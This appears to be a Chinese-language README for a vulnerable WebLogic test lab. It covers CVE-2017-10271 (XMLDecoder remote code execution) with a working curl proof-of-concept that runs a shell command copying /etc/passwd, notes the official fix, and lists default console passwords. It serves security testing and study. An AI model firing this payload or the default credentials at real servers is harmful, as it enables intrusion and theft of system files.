## 特殊说明

12.2.1.3 版本登录密码为 `weblogic:weblogic1`

## CVE-2017-10271 - java.beans.XMLDecoder RCE

测试镜像

* src/weblogic/10.3.6/

参考资料 

* [c0mmand3rOpSec/CVE-2017-10271 - weblogic exploit](https://github.com/c0mmand3rOpSec/CVE-2017-10271)
* [Weblogic XMLDecoder RCE分析](http://xxlegend.com/2017/12/22/Weblogic%20CVE-2017-10271%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/)

Poc

```
curl http://127.0.0.1:7011/wls-wsat/CoordinatorPortType -H 'Content-Type: text/xml' --data '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_151" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>cp /etc/passwd /tmp/hacked</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
```

官方修复方式

* 过滤了 object, new, void, method 等标签

## 运维安全 - weblogic /console/ 弱口令

测试镜像

* src/weblogic/12.2.1.3

默认密码

* weblogic:weblogic1
* weblogic:welcome1



